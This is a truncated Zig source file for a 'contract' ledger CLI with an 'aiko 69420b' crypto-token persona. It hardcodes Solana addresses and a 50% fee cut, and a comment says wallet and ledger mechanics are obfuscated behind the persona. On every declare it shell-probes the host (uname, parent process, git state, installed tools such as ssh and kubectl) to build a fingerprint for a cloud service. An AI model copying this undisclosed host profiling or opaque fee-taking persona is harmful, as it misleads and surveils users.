//! contract-zig — native core for the /contract substrate.
//!
//! This binary owns the load-bearing loop behind a small public surface:
//! declare, inspect, discover, search, and self. Manual stepping and manual
//! satisfaction are internal mechanics, not user-facing escape hatches.
const std = @import("std");
const builtin = @import("builtin");

/// Portable self-executable path. Darwin uses _NSGetExecutablePath; Linux
/// readlinks /proc/self/exe. Returns a slice into the caller-provided buf
/// (no null terminator) or an error.
fn selfExePathPortable(buf: []u8) ![]const u8 {
    switch (builtin.os.tag) {
        .macos => {
            var size: u32 = @intCast(buf.len);
            if (_NSGetExecutablePath(buf.ptr, &size) != 0) return error.SelfPathTooLong;
            const len = std.mem.indexOfScalar(u8, buf, 0) orelse buf.len;
            return buf[0..len];
        },
        .linux => {
            const n = std.c.readlink("/proc/self/exe", buf.ptr, buf.len);
            if (n <= 0) return error.SelfPathTooLong;
            return buf[0..@intCast(n)];
        },
        else => return error.UnsupportedOS,
    }
}
const contract = @import("contract");
const client = @import("contract_client");
const pointer = @import("pointer.zig");
const ledger = @import("ledger.zig");
// The ONE terminal-event classifier (biology axis 1). Every event->terminal
// decision in this file routes through it, so isSatisfied/isDead/
// countTerminalEvents cannot drift apart the way they did before (fork F3 —
// isDead was blind to `purged` while isSatisfied and cache.terminalClass were not).
const terminal = contract.terminal;
// F1 opt-in receptor: value adoption (contract:/fulfil:/value-of:) is OPEN by
// default, but a producer may declare a signed adoption grant to restrict who
// may adopt its value. The gate decision is the one authority in capability.zig.
const capability = contract.capability;
// Energy-ranking atom (Phase 1): ebm = per-key centroid + energy; embed = the
// native stateless vector. Used to order the drill frontier best-first.
const ebm = contract.ebm;

const VERSION = "0.4.0-guarded-native-shape";

// ────────── public persona ──────────
// The OpenAI-compatible surface presents as `aiko 69420b`. The CA pointer
// is a Solana address surfaced in the model id + system layer; it is the
// only public-facing identifier — substrate mechanics (contracts, ledger,
// DAG, wallets) are obfuscated behind the humanizer.
const AIKO_PERSONA_NAME = "aiko 69420b";
const AIKO_PERSONA_CA = "2ZiSPGncrkwWa6GBZB4EDtsfq7HEWwkwsPFzEXieXjNL";
const AIKO_PERSONA_MODEL_ID = "aiko-69420b";

// ────────── vine doctrine — staking by abiding (John 15:6) ──────────
// The staking layer of the substrate. FDRY is the stake-only asset
// (whitepaper §10, Matt 6:24 — cannot serve two masters); stFDRY is the
// Voltr/Ranger vault LP receipt that proves a wallet is abiding in the
// vine — locked through the 3-day cooldown queue, earning NAV growth
// from product revenue routed via routeRevenue.ts (Mal 3:10 — the tithe
// in the storehouse). Slashed stFDRY MUST burn to vault (concentrating
// fruit in remaining abiding branches, John 15:6), NEVER redistribute.
// Slash quorum requires ≥2 witnesses (Deut 19:15). Tier eligibility
// gates on (stake × age × past-fruit) — never on stake alone (Matt 7:16
// — by their fruits ye shall know them; Matt 25:21 — faithful in little
// ruler over many). See SKILL.md "Vine Doctrine" section + verses.zig
// corpus (John 15:1, 15:4, 15:6 are the cornerstone rows).
const AIKO_VINE_DOCTRINE_VERSE = "John 15:6";
const AIKO_STAKE_TOKEN_FDRY = AIKO_PERSONA_CA; // FDRY = stake asset, same mint as persona CA
const AIKO_STAKE_VAULT = "Bpr49sQXsxwNXNMRWS2v3tTBGWu2QgZtdA83BX77xBX1"; // Voltr/Ranger FDRY-only vault

// Faremeter Flex policy constants — substrate canon, not env-configurable.
// Every flex_hold authorization auto-includes the Foundry/aiko cut as the
// first split; client destinations fill the remaining basis points.
const FOUNDRY_CUT_BPS: u32 = 5000; // 50% cut on every flex authorization
const USDC_SOL_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // mainnet USDC
// FOUNDRY_CUT_ADDRESS reuses the aiko 69420b persona CA pointer
// (operator can override the recipient via a contract-row canon, not env).
const FOUNDRY_CUT_ADDRESS = AIKO_PERSONA_CA;
const lineage_lib = @import("contract").Lineage;
const HkdfSha256 = std.crypto.kdf.hkdf.HkdfSha256;
const X25519 = std.crypto.dh.X25519;
const ChaCha20Poly1305 = std.crypto.aead.chacha_poly.ChaCha20Poly1305;
// Persona is selected at RUNTIME from argv[0]'s basename. One binary, two
// faces: invoked as `aiko` → declare-only (no verbs, just the goal +
// optional --private); invoked as anything else (canonical `contract`) →
// full verb dispatcher. The previous compile-time discriminator
// (`build_options.binary_name`) produced two byte-different binaries; the
// runtime path lets one binary serve both via a symlink (`aiko -> contract`)
// without behavior drift.
//
// Both globals are initialised exactly once at the top of `main` BEFORE any
// dispatch reads them. They are `var` because Zig requires runtime-computed
// values to live in mutable globals (or be threaded through every callsite);
// init-once-then-read matches the substrate's existing style for ambient
// process state. After `main` initialises them they are never written again.
var BINARY_NAME: []const u8 = "contract";
var AIKO_DECLARE_ONLY: bool = false;

const Row = struct {
    id: []const u8 = "",
    event: []const u8 = "",
    plan: []const u8 = "",
    action: []const u8 = "",
    cwd: []const u8 = "",
    parent_id: ?[]const u8 = null,
    child_id: []const u8 = "",
    action_result: []const u8 = "",
    action_exit: i32 = 0,
    wave: u32 = 0,
    satisfied: bool = false,
    env_pubkey: []const u8 = "",
    output_signature: []const u8 = "",
    parent_signature: []const u8 = "",
    input_hash: []const u8 = "",
    source_id: []const u8 = "",
    ts: []const u8 = "",
    // RBAC grant tuple (only populated for event=="grant" rows)
    actor_pubkey: []const u8 = "",
    role: []const u8 = "",
    scope: []const u8 = "",
    // F1 adoption-grant tuple (only populated for event=="grant" adoption
    // rows): grantee = who may adopt (contract id / glob / ancestor),
    // authority_pubkey = the granter's env_pubkey, authority_signature = the
    // granter's ed25519 sig over capability.grantDigest. A grant row is an
    // adoption restriction (not an RBAC grant) iff grantee+authority_signature
    // are both present.
    grantee: []const u8 = "",
    authority_pubkey: []const u8 = "",
    authority_signature: []const u8 = "",
    /// Layer per contract:d10b3dbb convention (1=system, 2=cell, 3=graph,
    /// 4=transport, 5=value, 6=operator). Inferred at declare from
    /// pointer.zig's inferLayer; persisted on the row.
    layer: u8 = 0,
};

fn writeFd(fd: c_int, bytes: []const u8) void {
    var rem = bytes;
    while (rem.len > 0) {
        const n = std.c.write(fd, rem.ptr, rem.len);
        if (n <= 0) return;
        rem = rem[@intCast(n)..];
    }
}

/// Mirror of build.sh's acquire_build_lock loop, read-only side. Block this
/// binary while a build is in progress at /tmp/contract-build.lock; reclaim
/// the lock if its owner pid is dead. Capped at 1800s — past that we let the
/// invocation proceed against whatever binary is on disk and surface the
/// timeout to stderr (visible-fallback rule). Best-effort: a syscall failure
/// just lets the binary run.
fn waitForBuildLock(env: std.process.Environ) void {
    _ = env;
    const lock_path: [*:0]const u8 = "/tmp/contract-build.lock";
    const pid_path: [*:0]const u8 = "/tmp/contract-build.lock/pid";
    var waited: u32 = 0;
    const max_wait: u32 = 1800;
    var announced = false;
    while (waited < max_wait) {
        var st: c_stat = .{};
        if (stat(lock_path, &st) != 0) return; // no lock → free
        // Read pid file (best-effort) and check liveness via kill(pid, 0).
        const owner_pid: c_int = blk: {
            var pid_st: c_stat = .{};
            if (stat(pid_path, &pid_st) != 0) break :blk 0;
            var flags: std.c.O = .{};
            flags.ACCMODE = .RDONLY;
            const fd = std.c.open(pid_path, flags, @as(c_uint, 0));
            if (fd < 0) break :blk 0;
            defer _ = std.c.close(fd);
            var buf: [32]u8 = undefined;
            const n = std.c.read(fd, &buf, buf.len);
            if (n <= 0) break :blk 0;
            const trimmed = std.mem.trim(u8, buf[0..@intCast(n)], &std.ascii.whitespace);
            break :blk std.fmt.parseInt(c_int, trimmed, 10) catch 0;
        };
        if (owner_pid > 0 and kill(owner_pid, 0) != 0) {
            // Owner is dead — reclaim like build.sh's loop does.
            errPrint("aiko: build lock owner pid={d} is dead — reclaiming\n", .{owner_pid});
            _ = std.c.unlink(pid_path);
            _ = rmdir(lock_path);
            return;
        }
        if (!announced) {
            errPrint("aiko: build in progress (pid={d}) — queued, waiting...\n", .{owner_pid});
            announced = true;
        }
        _ = sleep(1);
        waited += 1;
    }
    errPrint("aiko: build lock wait exceeded {d}s — proceeding against on-disk binary\n", .{max_wait});
}

/// Mirror of fd-2 writes for the `evidence` row flush at end of cmdSpeak.
const STDERR_TAPE_CAP: usize = 1024 * 1024;
var stderr_tape_buf: ?std.ArrayList(u8) = null;
var stderr_tape_alloc: ?std.mem.Allocator = null;
var stderr_tape_armed: bool = false;
var stderr_tape_capped: bool = false;

fn armStderrTape(allocator: std.mem.Allocator) void {
    if (stderr_tape_armed) return;
    stderr_tape_buf = .empty;
    stderr_tape_alloc = allocator;
    stderr_tape_armed = true;
    stderr_tape_capped = false;
}

fn out(bytes: []const u8) void {
    writeFd(std.c.STDOUT_FILENO, bytes);
}

fn err(bytes: []const u8) void {
    writeFd(std.c.STDERR_FILENO, bytes);
    if (!stderr_tape_armed) return;
    if (stderr_tape_capped) return;
    const a = stderr_tape_alloc orelse return;
    if (stderr_tape_buf) |*buf| {
        if (buf.items.len + bytes.len > STDERR_TAPE_CAP) {
            stderr_tape_capped = true;
            return;
        }
        buf.appendSlice(a, bytes) catch {};
    }
}

fn outPrint(comptime fmt: []const u8, args: anytype) void {
    var buf: [8192]u8 = undefined;
    const s = std.fmt.bufPrint(&buf, fmt, args) catch return;
    out(s);
}

fn errPrint(comptime fmt: []const u8, args: anytype) void {
    var buf: [8192]u8 = undefined;
    const s = std.fmt.bufPrint(&buf, fmt, args) catch return;
    err(s);
}

fn evidence(bytes: []const u8) void {
    err(bytes);
}

fn evidencePrint(comptime fmt: []const u8, args: anytype) void {
    errPrint(fmt, args);
}

/// purge:bb70d7a3 — single evidence-writer that funnels both
/// errPrint and evidencePrint to stderr with a single shape.
/// Allows the future collapse: all evidence flows through this
/// one writer; substrate-attested evidence rows can replace it
/// when the cloud's ledger.appendEvidencePrintRow lands.
fn substrateEvidence(comptime fmt: []const u8, args: anytype) void {
    var buf: [8192]u8 = undefined;
    const s = std.fmt.bufPrint(&buf, fmt, args) catch return;
    err(s);
}

fn usage() void {
    errPrint("{s} {s}\n\nUsage:\n", .{ BINARY_NAME, VERSION });
    if (AIKO_DECLARE_ONLY) {
        errPrint(
            \\  {s} "<truth claim>" [--private]
            \\
            \\No verbs, no env knobs, no escape hatches. The substrate
            \\reads only the goal and an optional visibility flag;
            \\lineage, hooks, adapters, and child neurons are
            \\server-determined.
            \\
            \\Default (no flag) → shared visibility. The row joins the
            \\substrate's shared graph: cloud declare via Unbrowse;
            \\failed or unpaid requests remain visible and retryable;
            \\there is no local inference fallback.
            \\
            \\--private → never leaves this machine. Runs the one-shot
            \\Genesis-days lifecycle against the on-disk ledger only.
            \\Use when the goal contains PII, secrets, or anything the
            \\operator does not want federated.
            \\
            \\The vocabulary is visibility, not transport.
            \\
        , .{BINARY_NAME});
        return;
    }
    errPrint(
        \\  {s} declare <truth-claim>
        \\
    , .{BINARY_NAME});
    if (!AIKO_DECLARE_ONLY) {
        errPrint(
            \\  {s} recommend <goal>
            \\  {s} status [<id>]
            \\  {s} tick [--every <seconds>]
            \\  {s} import-root <seed-file>
            \\
        , .{ BINARY_NAME, BINARY_NAME, BINARY_NAME, BINARY_NAME });
    }
}

fn jsonString(line: []const u8, key: []const u8) ?[]const u8 {
    var needle_buf: [128]u8 = undefined;
    const needle = std.fmt.bufPrint(&needle_buf, "\"{s}\":", .{key}) catch return null;
    const at = std.mem.indexOf(u8, line, needle) orelse return null;
    var start = at + needle.len;
    while (start < line.len and (line[start] == ' ' or line[start] == '\t')) : (start += 1) {}
    if (start >= line.len or line[start] != '"') return null;
    start += 1;
    var i = start;
    while (i < line.len) : (i += 1) {
        if (line[i] == '\\') {
            i += 1;
            continue;
        }
        if (line[i] == '"') return line[start..i];
    }
    return null;
}

fn jsonInt(line: []const u8, key: []const u8) ?i32 {
    var needle_buf: [128]u8 = undefined;
    const needle = std.fmt.bufPrint(&needle_buf, "\"{s}\": ", .{key}) catch return null;
    const at = std.mem.indexOf(u8, line, needle) orelse return null;
    const start = at + needle.len;
    var end = start;
    while (end < line.len and ((line[end] >= '0' and line[end] <= '9') or line[end] == '-')) : (end += 1) {}
    if (end == start) return null;
    return std.fmt.parseInt(i32, line[start..end], 10) catch null;
}

fn jsonNullableString(line: []const u8, key: []const u8) ?[]const u8 {
    if (jsonString(line, key)) |s| return s;
    return null;
}

/// Symmetric to `writeJsonString` in libcontract/src/contract.zig. Without it,
/// bytes round-tripped through the ledger reach downstream interpreters with
/// escapes still literal — `"d[\"thread\"]"` shells out as 14 bytes including
/// the backslashes, and python -c rejects it.
fn unescapeJsonValue(allocator: std.mem.Allocator, src: []const u8) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    errdefer buf.deinit(allocator);
    var i: usize = 0;
    while (i < src.len) : (i += 1) {
        if (src[i] != '\\' or i + 1 >= src.len) {
            try buf.append(allocator, src[i]);
            continue;
        }
        switch (src[i + 1]) {
            'n' => try buf.append(allocator, '\n'),
            't' => try buf.append(allocator, '\t'),
            'r' => try buf.append(allocator, '\r'),
            '"' => try buf.append(allocator, '"'),
            '\\' => try buf.append(allocator, '\\'),
            '/' => try buf.append(allocator, '/'),
            'b' => try buf.append(allocator, 0x08),
            'f' => try buf.append(allocator, 0x0c),
            'u' => {
                if (i + 5 >= src.len) {
                    try buf.append(allocator, src[i]);
                    try buf.append(allocator, src[i + 1]);
                    i += 1;
                    continue;
                }
                const hex = src[i + 2 .. i + 6];
                const cp = std.fmt.parseInt(u21, hex, 16) catch {
                    try buf.append(allocator, src[i]);
                    try buf.append(allocator, src[i + 1]);
                    i += 1;
                    continue;
                };
                var ubuf: [4]u8 = undefined;
                const n = std.unicode.utf8Encode(cp, &ubuf) catch {
                    try buf.append(allocator, src[i]);
                    try buf.append(allocator, src[i + 1]);
                    i += 1;
                    continue;
                };
                try buf.appendSlice(allocator, ubuf[0..n]);
                i += 4;
            },
            else => {
                try buf.append(allocator, src[i]);
                try buf.append(allocator, src[i + 1]);
            },
        }
        i += 1;
    }
    return buf.toOwnedSlice(allocator);
}

fn jsonStringDecoded(allocator: std.mem.Allocator, line: []const u8, key: []const u8) !?[]u8 {
    const raw = jsonString(line, key) orelse return null;
    return try unescapeJsonValue(allocator, raw);
}

/// Count `satisfied` + `died` events across all rows. Used as the
/// progress signal for backfill: HOLDs alone don't count, only terminal
/// verdicts (satisfaction or inherent-impossibility apoptosis).
fn countTerminalEvents(rows: []const Row) usize {
    var n: usize = 0;
    for (rows) |r| {
        // Routes through the ONE authority: any terminal (satisfied, died, OR
        // purged) is progress. Previously counted only satisfied+died, missing
        // `purged` — a Decalogue purge IS a terminal verdict and must count.
        if (terminal.isTerminal(terminal.classify(r.event))) n += 1;
    }
    return n;
}

// Within-process ledger parse cache (bench finding, docs/journal.md
// 2026-06-11): resolver passes re-parsed the FULL ledger per pass and per
// candidate row — O(reads × rows) CPU and one leaked ledger buffer per
// read (~3.2 GB RSS observed at 2k rows). The ledger is append-only, so
// file size is a sound invalidation key. The cache owns the template
// slice and the backing strings; callers receive a fresh struct-slice
// copy and free the SLICE only — string ownership never transfers, which
// preserves the existing borrow contract. Old generations leak bounded
// by APPENDS per process, not by reads.
var parse_cache_size: u64 = 0;
var parse_cache_rows: ?[]Row = null;

/// Parse one ledger line into a Row. Cheap fields borrow from `line`
/// (which borrows from a process-lifetime buffer); decoded fields
/// allocate. ONE named place for the row schema read.
fn parseRowLine(allocator: std.mem.Allocator, line: []const u8) Row {
    var r = Row{};
    r.id = jsonString(line, "id") orelse "";
    r.event = jsonString(line, "event") orelse "";
    // User-shaped fields are decoded here so shell/python/argv consumers
    // never see literal escapes. Owned slices leak with the backing buffer
    // for the process lifetime (see parseRows header comment).
    r.plan = (jsonStringDecoded(allocator, line, "plan") catch null) orelse "";
    r.action = (jsonStringDecoded(allocator, line, "action") catch null) orelse "";
    r.cwd = (jsonStringDecoded(allocator, line, "cwd") catch null) orelse "";
    r.parent_id = jsonNullableString(line, "parent_id");
    r.child_id = jsonString(line, "child_id") orelse "";
    r.action_result = (jsonStringDecoded(allocator, line, "action_result") catch null) orelse "";
    r.action_exit = jsonInt(line, "action_exit") orelse 0;
    r.wave = @intCast(jsonInt(line, "wave") orelse 0);
    r.satisfied = std.mem.eql(u8, r.event, "satisfied");
    r.env_pubkey = jsonString(line, "env_pubkey") orelse "";
    r.output_signature = jsonString(line, "output_signature") orelse "";
    r.input_hash = jsonString(line, "input_hash") orelse "";
    r.source_id = jsonString(line, "source_id") orelse "";
    r.ts = jsonString(line, "ts") orelse "";
    r.actor_pubkey = jsonString(line, "actor_pubkey") orelse "";
    r.role = jsonString(line, "role") orelse "";
    r.scope = jsonString(line, "scope") orelse "";
    r.grantee = jsonString(line, "grantee") orelse "";
    r.authority_pubkey = jsonString(line, "authority_pubkey") orelse "";
    r.authority_signature = jsonString(line, "authority_signature") orelse "";
    r.parent_signature = jsonString(line, "parent_signature") orelse "";
    r.layer = @intCast(jsonInt(line, "layer") orelse 0);
    return r;
}

fn parseRows(allocator: std.mem.Allocator, env: std.process.Environ) ![]Row {
    const cur_size = ledger.currentSize(allocator, env);
    if (parse_cache_rows) |tmpl| {
        // Same size → serve the template untouched.
        if (cur_size != 0 and cur_size == parse_cache_size) {
            const copy = try allocator.alloc(Row, tmpl.len);
            @memcpy(copy, tmpl);
            return copy;
        }
        // Grew (the common resolver case: our own appends between calls)
        // → parse ONLY the appended tail and extend the template. Sound
        // because the file is append-only and every append is one whole
        // `row + "\n"` writev — any previously observed size is a line
        // boundary. O(new bytes) per resolver step instead of O(file).
        if (cur_size > parse_cache_size and parse_cache_size != 0) {
            const tail = try ledger.readFrom(allocator, env, parse_cache_size);
            var rows: std.ArrayList(Row) = .empty;
            errdefer rows.deinit(allocator);
            try rows.appendSlice(allocator, tmpl);
            var it = std.mem.splitScalar(u8, tail, '\n');
            while (it.next()) |line| {
                if (line.len == 0) continue;
                try rows.append(allocator, parseRowLine(allocator, line));
            }
            const owned = try rows.toOwnedSlice(allocator);
            const new_tmpl = try allocator.alloc(Row, owned.len);
            @memcpy(new_tmpl, owned);
            allocator.free(tmpl);
            parse_cache_rows = new_tmpl;
            parse_cache_size = cur_size;
            return owned;
        }
    }
    const data = try ledger.readAll(allocator, env);
    // Rows intentionally borrow slices from `data`. The native CLI is a
    // short-lived process, so keeping the ledger buffer alive until process
    // exit is simpler and safer than duplicating every field.

    var rows: std.ArrayList(Row) = .empty;
    errdefer rows.deinit(allocator);
    var it = std.mem.splitScalar(u8, data, '\n');
    while (it.next()) |line| {
        if (line.len == 0) continue;
        try rows.append(allocator, parseRowLine(allocator, line));
    }
    const owned = try rows.toOwnedSlice(allocator);
    // Stash the template. The previous template's slice memory is freed;
    // backing strings leak bounded by appends, not reads (see header).
    if (parse_cache_rows) |old| allocator.free(old);
    const tmpl = try allocator.alloc(Row, owned.len);
    @memcpy(tmpl, owned);
    parse_cache_rows = tmpl;
    parse_cache_size = cur_size;
    return owned;
}

fn latestDeclared(rows: []const Row, id: []const u8) ?Row {
    var found: ?Row = null;
    for (rows) |r| {
        if (std.mem.eql(u8, r.event, "declared") and std.mem.eql(u8, r.id, id)) found = r;
    }
    return found;
}

fn isSatisfied(rows: []const Row, id: []const u8) bool {
    // Temporal coherence: a contract that was satisfied then died is NOT
    // satisfied anymore. Walk the rows newest-to-oldest and return the
    // LATEST terminal verdict — `satisfied` wins only if it appears
    // strictly after any `died` for the same id. The fractal demands
    // truth is what holds NOW (John 17:17 — the Word, present tense),
    // not what once was. Append-only ledger + latest-terminal semantics
    // is the correct read; the prior implementation (return on first
    // satisfied match, regardless of later death) was the load-bearing
    // temporal-incoherence contradiction surfaced by contract a1c68c4e.
    // Latest terminal wins (temporal coherence, a1c68c4e). Routes the event
    // classification through the ONE authority (terminal.zig) instead of
    // re-inlining the {satisfied,died,purged} string set — so this and every
    // other reader agree by construction. satisfied → true; any nulling terminal
    // (dead or purged) → false; keep walking on non-terminal rows.
    var i: usize = rows.len;
    while (i > 0) : (i -= 1) {
        const r = rows[i - 1];
        if (!std.mem.eql(u8, r.id, id)) continue;
        switch (terminal.classify(r.event)) {
            .satisfied => return true,
            .dead, .purged => return false,
            .pending => {},
        }
    }
    return false;
}

/// Natural-selection projection: has a NULLING terminal (died OR purged) been
/// appended for this id? Append-only — once nullified, stays nullified (Hebrews
/// 9:27, appointed once to die). Routes through the ONE terminal authority
/// (terminal.nullifies = dead||purged), which is the fix for fork F3: isDead was
/// blind to `purged`, so a satisfied-then-purged child was neither dead (this)
/// nor satisfied (isSatisfied), and its neuron/funnel parent HELD FOREVER
/// instead of inheriting death. Verified: examples/arc-agi3/arc-validate-inherit-death.sh
/// fails without the `purged` recognition this delegation now provides.
///
/// Note: this keeps the "once nullified stays nullified" scan (any nulling
/// terminal anywhere → dead), matching the existing Hebrews stance rather than
/// switching to isSatisfied's latest-terminal-wins. A died-then-satisfied
/// revival would make both isDead and isSatisfied true — a theoretical case
/// (zero such rows in the real ledger); resolving it means a latest-wins isDead,
/// which is a doctrine decision left for Lewis.
fn isDead(rows: []const Row, id: []const u8) bool {
    for (rows) |r| {
        if (!std.mem.eql(u8, r.id, id)) continue;
        if (terminal.nullifies(terminal.classify(r.event))) return true;
    }
    return false;
}

fn latestWave(rows: []const Row, id: []const u8) u32 {
    var w: u32 = 0;
    for (rows) |r| {
        if (std.mem.eql(u8, r.id, id) and std.mem.eql(u8, r.event, "iterated")) {
            if (r.wave > w) w = r.wave;
        }
    }
    return w;
}

fn appendUnique(ids: *std.ArrayList([]const u8), allocator: std.mem.Allocator, id: []const u8) !void {
    for (ids.items) |existing| {
        if (std.mem.eql(u8, existing, id)) return;
    }
    try ids.append(allocator, id);
}

fn childIds(allocator: std.mem.Allocator, rows: []const Row, parent_id: []const u8) ![][]const u8 {
    var ids: std.ArrayList([]const u8) = .empty;
    errdefer ids.deinit(allocator);
    for (rows) |r| {
        if (std.mem.eql(u8, r.event, "declared")) {
            if (r.parent_id) |p| {
                if (std.mem.eql(u8, p, parent_id)) try ids.append(allocator, r.id);
            }
        }
    }
    return try ids.toOwnedSlice(allocator);
}

fn dependentIds(allocator: std.mem.Allocator, rows: []const Row, target_id: []const u8) ![][]const u8 {
    var ids: std.ArrayList([]const u8) = .empty;
    errdefer ids.deinit(allocator);
    var needle_buf: [32]u8 = undefined;
    const needle_c = std.fmt.bufPrint(&needle_buf, "contract:{s}", .{target_id}) catch return try ids.toOwnedSlice(allocator);
    var needle_f: [32]u8 = undefined;
    const needle_fulfil = std.fmt.bufPrint(&needle_f, "fulfil:{s}", .{target_id}) catch return try ids.toOwnedSlice(allocator);
    var needle_v: [32]u8 = undefined;
    const needle_value = std.fmt.bufPrint(&needle_v, "value-of:{s}", .{target_id}) catch return try ids.toOwnedSlice(allocator);
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (std.mem.indexOf(u8, r.action, needle_c) != null or
            std.mem.indexOf(u8, r.action, needle_fulfil) != null or
            std.mem.indexOf(u8, r.action, needle_value) != null)
        {
            try appendUnique(&ids, allocator, r.id);
        }
    }
    return try ids.toOwnedSlice(allocator);
}

extern fn system(command: [*:0]const u8) c_int;
extern fn popen(command: [*:0]const u8, mode: [*:0]const u8) ?*anyopaque;
extern fn pclose(stream: *anyopaque) c_int;
extern fn fread(ptr: [*]u8, size: usize, nmemb: usize, stream: *anyopaque) usize;
extern fn feof(stream: *anyopaque) c_int;
extern fn getentropy(buf: [*]u8, len: usize) c_int;
// macOS stat: we only need st_mode (u16 on Darwin) — declare a minimal stat
// struct in C ABI. Use _DARWIN_FEATURE_64_BIT_INODE via stat$INODE64 on
// older Darwin; the default symbol on arm64 macOS 11+ is already 64-bit.
const c_stat = extern struct {
    st_dev: i32 = 0,
    st_mode: u16 = 0,
    st_nlink: u16 = 0,
    st_ino: u64 = 0,
    st_uid: u32 = 0,
    st_gid: u32 = 0,
    st_rdev: i32 = 0,
    st_atimespec: extern struct { tv_sec: i64 = 0, tv_nsec: i64 = 0 } = .{},
    st_mtimespec: extern struct { tv_sec: i64 = 0, tv_nsec: i64 = 0 } = .{},
    st_ctimespec: extern struct { tv_sec: i64 = 0, tv_nsec: i64 = 0 } = .{},
    st_birthtimespec: extern struct { tv_sec: i64 = 0, tv_nsec: i64 = 0 } = .{},
    st_size: i64 = 0,
    st_blocks: i64 = 0,
    st_blksize: i32 = 0,
    st_flags: u32 = 0,
    st_gen: u32 = 0,
    st_lspare: i32 = 0,
    st_qspare: [2]i64 = .{ 0, 0 },
};
extern fn stat(path: [*:0]const u8, st: *c_stat) c_int;
extern fn time(t: ?*i64) i64;
extern fn kill(pid: c_int, sig: c_int) c_int;
extern fn sleep(secs: c_uint) c_uint;
extern fn rmdir(path: [*:0]const u8) c_int;
const c_tm = extern struct {
    tm_sec: c_int = 0,
    tm_min: c_int = 0,
    tm_hour: c_int = 0,
    tm_mday: c_int = 0,
    tm_mon: c_int = 0,
    tm_year: c_int = 0,
    tm_wday: c_int = 0,
    tm_yday: c_int = 0,
    tm_isdst: c_int = 0,
    tm_gmtoff: c_long = 0,
    tm_zone: ?[*:0]const u8 = null,
};
extern fn gmtime_r(timep: *const i64, result: *c_tm) ?*c_tm;

/// Look up the latest non-empty action_result for `cid` in the in-memory rows.
/// Used to propagate context up the tree as a posthook payload env var.
fn latestActionResult(rows: []const Row, cid: []const u8) ?[]const u8 {
    var i: usize = rows.len;
    while (i > 0) : (i -= 1) {
        const r = rows[i - 1];
        if (!std.mem.eql(u8, r.id, cid)) continue;
        if (r.action_result.len == 0) continue;
        return r.action_result;
    }
    return null;
}

/// ───────────── environment fingerprint ─────────────
/// Every aiko, on every declare, captures a JSON fingerprint of its host
/// environment so the cloud compiler can choose the right adapter contract
/// for binding (ssh, bash, telegram, docker, python, ...). The local
/// binary doesn't decide HOW to bind — that's a server-side adapter
/// contract per canon. It only NAMES what's available.
///
/// Doctrine parallel: Pentecost (Acts 2) — the substrate "speaks in the
/// host's tongue" automatically. Babel inverted: many tongues, one
/// grammar. The fingerprint is the substrate listening to discover which
/// tongue the local host speaks before declaring anything.
fn bioProbeCommand(allocator: std.mem.Allocator, name: []const u8) bool {
    var cmd_buf: [256]u8 = undefined;
    const cmd = std.fmt.bufPrintZ(&cmd_buf, "command -v {s} >/dev/null 2>&1", .{name}) catch return false;
    _ = allocator;
    return system(cmd.ptr) == 0;
}

fn bioCaptureLine(allocator: std.mem.Allocator, shell_cmd: []const u8) ![]u8 {
    const cmd_z = try allocator.dupeZ(u8, shell_cmd);
    defer allocator.free(cmd_z);
    const fp = popen(cmd_z.ptr, "r") orelse return error.PopenFailed;
    var buf: [4096]u8 = undefined;
    const n = fread(&buf, 1, buf.len, fp);
    _ = pclose(fp);
    if (n == 0) return try allocator.dupe(u8, "");
    var line: []u8 = buf[0..n];
    while (line.len > 0 and (line[line.len - 1] == '\n' or line[line.len - 1] == '\r' or line[line.len - 1] == ' ')) {
        line = line[0 .. line.len - 1];
    }
    return try allocator.dupe(u8, line);
}

fn bioEnvironmentFingerprint(allocator: std.mem.Allocator, env: std.process.Environ) ![]u8 {
    _ = env;
    const uname = bioCaptureLine(allocator, "uname -srm") catch try allocator.dupe(u8, "unknown");
    defer allocator.free(uname);
    const shell: []const u8 = "";
    const term: []const u8 = "";
    var cwd_buf: [4096]u8 = undefined;
    const cwd_ptr = std.c.getcwd(&cwd_buf, cwd_buf.len);
    const cwd: []const u8 = if (cwd_ptr) |p| std.mem.span(@as([*:0]const u8, @ptrCast(p))) else "";
    // Parent process — invocation lineage (Luke 2:1-3: identity tagged by line).
    // Tells the cloud compiler which agent/channel spawned this aiko so
    // identity_channel scoping for capability grants can fire.
    const ppid = std.c.getppid();
    var ppid_cmd_buf: [128]u8 = undefined;
    const ppid_cmd = std.fmt.bufPrint(&ppid_cmd_buf, "ps -p {d} -o comm= 2>/dev/null", .{ppid}) catch "";
    const parent_comm = bioCaptureLine(allocator, ppid_cmd) catch try allocator.dupe(u8, "");
    defer allocator.free(parent_comm);
    // Git working-tree state — branch + HEAD + dirty bit (John 8:14:
    // "I know whence I came"). cwd locates the body; git state locates the
    // moment-in-history within that body.
    const git_branch = bioCaptureLine(allocator, "git rev-parse --abbrev-ref HEAD 2>/dev/null") catch try allocator.dupe(u8, "");
    defer allocator.free(git_branch);
    const git_commit = bioCaptureLine(allocator, "git rev-parse --short HEAD 2>/dev/null") catch try allocator.dupe(u8, "");
    defer allocator.free(git_commit);
    const git_dirty_probe = bioCaptureLine(allocator, "git status --porcelain 2>/dev/null | head -c 1") catch try allocator.dupe(u8, "");
    defer allocator.free(git_dirty_probe);
    const git_dirty: []const u8 = if (git_dirty_probe.len > 0) "true" else "false";
    // Probe a fixed list of binding-relevant CLIs.
    const probes = [_][]const u8{ "ssh", "bash", "zsh", "docker", "python3", "node", "git", "curl", "wg", "telethon", "tg-cli", "kubectl" };
    var caps: std.ArrayList(u8) = .empty;
    defer caps.deinit(allocator);
    try caps.append(allocator, '[');
    var first = true;
    for (probes) |p| {
        if (!bioProbeCommand(allocator, p)) continue;
        if (!first) try caps.append(allocator, ',');
        first = false;
        try caps.append(allocator, '"');
        try caps.appendSlice(allocator, p);
        try caps.append(allocator, '"');
    }
    try caps.append(allocator, ']');
    return try std.fmt.allocPrint(
        allocator,
        "{{\"uname\":\"{s}\",\"shell\":\"{s}\",\"term\":\"{s}\",\"cwd\":\"{s}\",\"ppid\":{d},\"parent_comm\":\"{s}\",\"git_branch\":\"{s}\",\"git_commit\":\"{s}\",\"git_dirty\":{s},\"caps\":{s}}}",
        .{ uname, shell, term, cwd, ppid, parent_comm, git_branch, git_commit, git_dirty, caps.items },
    );
}

/// Bind manifest — CONTRACT_BIND_KIND + CONTRACT_BIND_TARGET name the
/// stdio channel this contract wants to bind to (e.g.
